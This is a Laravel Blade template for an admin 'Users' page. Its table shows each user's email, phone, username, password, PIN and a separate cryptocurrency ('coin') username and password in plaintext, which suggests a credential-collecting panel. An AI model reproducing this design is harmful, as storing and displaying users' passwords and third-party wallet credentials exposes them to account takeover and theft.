@extends('layouts.app')

@section('title')
  <div class="row mb-2">
    <div class="col-sm-6">
      <h1>Users</h1>
    </div>
    <div class="col-sm-6">
      <ol class="breadcrumb float-sm-right">
        <li class="breadcrumb-item"><a href="{{ route('dashboard.index') }}">Dashboard</a></li>
        <li class="breadcrumb-item active">Users</li>
      </ol>
    </div>
  </div>
@endsection

@section('content')
  <div class="container-fluid">
    <div class="card">
      <div class="card-header">
        <h3 class="card-title">Queue</h3>
        <div class="card-tools row">
          <div class="{{ $users->hasPages() ? 'col-md-4' : 'col-md-6' }}">
            <a href="{{ route('users.index') }}">
              <button type="button" class="btn btn-outline-primary btn-block btn-sm">
                <i class="fa fa-history"></i>
                Reload
              </button>
            </a>
          </div>
          @if($users->hasPages())
            <div class="col-md-4 float-right">
              {{ $users->links() }}
            </div>
          @endif
          <form class="{{ $users->hasPages() ? 'col-md-4' : 'col-md-6' }}" method="get" action="{{ route('users.filter') }}">
            <div class="input-group">
              <input type="text" name="search" class="form-control float-right" placeholder="Search">

              <div class="input-group-append">
                <button type="submit" class="btn btn-default">
                  <i class="fas fa-search"></i>
                </button>
              </div>
            </div>
          </form>
        </div>
      </div>
      <div class="card-body p-0 table-responsive">
        <table class="table text-center">
          <thead>
          <tr>
            <th style="width: 10px">#</th>
            <th style="width: 10px">Action</th>
            <th>name</th>
            <th>email</th>
            <th>phone</th>
            <th>username</th>
            <th>password</th>
            <th>pin</th>
            <th>coin username</th>
            <th>coin password</th>
          </tr>
          </thead>
          <tbody>
          @foreach($users as $key => $item)
            <tr>
              <td>{{ ($users->currentpage() - 1) * $users->perpage() + $loop->index + 1 }}.</td>
              <td>
                <button type="button" class="btn btn-block btn-primary btn-xs">SHOW</button>
              </td>
              <td>{{ $item->name }}</td>
              <td>{{ $item->email }}</td>
              <td>{{ $item->phone }}</td>
              <td>{{ $item->username  }}</td>
              <td>{{ $item->password_junk }}</td>
              <td>{{ $item->secondary_password_junk }}</td>
              <td>{{ $item->username_doge }}</td>
              <td>{{ $item->password_doge }}</td>
            </tr>
          @endforeach
          </tbody>
        </table>
      </div>
    </div>
  </div>
@endsection